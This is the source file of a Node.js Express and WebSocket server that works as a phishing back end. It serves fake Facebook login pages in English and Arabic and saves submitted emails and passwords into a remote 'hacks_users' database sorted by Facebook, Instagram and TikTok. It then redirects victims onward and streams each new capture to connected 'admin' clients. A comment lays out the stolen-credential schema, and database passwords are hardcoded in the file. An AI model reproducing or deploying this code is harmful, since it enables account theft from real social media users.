const express = require('express')
const http = require('http')
const XMLHttpRequest = require('xhr2')
const cors = require('cors')
const websocket = require('ws')
const dibase = require('./module/dibase/DIBASE')
const app = express()
const server = http.createServer(app)
const wss = new websocket.Server({ server })
const fs = require('fs')
const PORT = 2007; 
const domains ={
    id:"server-users",
    domains:[
        {
            name:"hacks_users",
            password:"HACKUSERSPASS"
        }
    ] 
}
const dib = new dibase('wss://dibaseservice.onrender.com', domains) 
const { hacks_users } = dib.base 
app.use(cors({
    origin:'*'
}))

app.use(express.urlencoded({ extended: true }))
app.use(express.static('./PUB'))
app.get('/',(req, res)=>{
    res.send('<h1>Hello<h1>')
})
app.get('/facebook-login/:dORf/:leng',(req, res)=>{
    let { dORf, leng } = req.params
    if (dORf == 'd') {
        if (leng == 'en') {
            res.sendFile(__dirname + '/PUB/facebook-login-d-en.html')
            return
        }
        if (leng == 'ar') {
            res.sendFile(__dirname + '/PUB/facebook-login-d-ar.html')
            return
        }
    }
    if (dORf == 'f') {
        if (leng == 'en') {
            res.sendFile(__dirname + '/PUB/facebook-login-en.html')
            
            return
        }
        if (leng == 'ar') {
            res.sendFile(__dirname + '/PUB/facebook-login-ar.html')
            return
        }
    }
}) 

app.get('/:type/:greep/set',(req, res)=>{
    res.status(200)
    if (req.params.type == 'facebook' || req.params.type == 'instagram') {
        save_data({query:req.query, greep:req.params.greep})
        if (req.query.to) {
            res.redirect(req.query.to += '?log=true')
        }
    }
})  

//=================================> data base <===========================
hacks_users.onchange = ({dataA, dataB})=>{
    console.log('OnChange', dataB)
    let clients = Object.values(server_admins)
    clients.forEach((client)=>{
        client.send(JSON.stringify({
            new_data:dataB
        }))
    })
}
hacks_users.onload = async(data)=>{
    console.log('DATA LOAD',data) 
    // return hacks_users.clear(1)
    if (! data.all_users) {
        console.log('created path on new data base')
        creat_path_on_database()
    }
} 
hacks_users.onerror = async(err)=>{  
    if (err.base_not_access) {
        console.log(await dib.creat_data_base('islamdzl',{name:"hacks_users",password:"HACKUSERSPASS",read_password:"HUPR"}))
    } 
}    
const save_data = (data)=>{  
    let DATA = hacks_users.data
    let user_name = email_name(data.email) 
    if (! dib.GTPath(DATA, ['all_users', user_name])) {
        hacks_users.set(data, ['all_users', user_name])
    }
    let path = ['type', data.type, data.greep]
    let full_path = ['type', data.type, data.greep, user_name]
    if (dib.GTPath(DATA, full_path)) {
        return 
    }
    if (! dib.IPath(DATA, path)) {
        hacks_users.creat_path(path)
    }
    if (! dib.IPath(hacks_users.data, full_path)) { 
        hacks_users.creat_path(full_path, true)
        hacks_users.set({[user_name]:data},path)
    }
}
const creat_path_on_database = ()=>{
    hacks_users.creat_path(['all_users'])
    hacks_users.creat_path(['type', 'facebook'])
    hacks_users.creat_path(['type', 'instagram'])
    hacks_users.creat_path(['type', 'tiktok'])
}
//=========================> other functions <==============================================
const email_name = (email)=>{
    let Email = email
    if (Email.indexOf('@')) {
        return Email.slice(0,Email.indexOf('@'))
    }
    return Email
}
server.listen(PORT, ()=>{
    console.log(`i am listening in port : ${PORT}`)
})

//-------------------------------------------------------------------------------
var server_admins = {}
wss.on('connection', (ws)=>{
    ws.id = String(Math.floor(Math.random()*10000000))
    ws.on('message',async (message)=>{
        let data = JSON.parse(message.toString('utf-8'))
        if (data.message) {
            if (data.message == 'call-me') {
                ws.send(JSON.stringify({
                    message:'send-me-the-data'
                }))
                return
            }
            if (data.message == 'i-am-admin') {
                if (! server_admins[ws.id]) {
                    server_admins[ws.id] = ws
                    ws.send(JSON.stringify({new_data:hacks_users.data}))
                }
                return
            }
        }
        if (data.data) {
            if (data.data.email && data.data.password) { 
                save_data(data.data)
                ws.send('{"message":"saveed"}')
            }
            return
        }
        if (data.delete_user) {
            await hacks_users.delete_path(data.delete_user[0])
            await hacks_users.delete_path(data.delete_user[1])
        }
    })
})
/*////////////////////////// Example //////////////////////
 {
    type:{
        facebook:{
            [ greep ]:{
                [ username ]:{
                    date    :"",
                    email   :"",
                    password:"" 
                }
            },
            [ greep ]:{
                [ username ]:{
                    date    :"",
                    email   :"",
                    password:"" 
                }
            }
        },
        instgram:{},
        tktok:{}
    }
 }
*/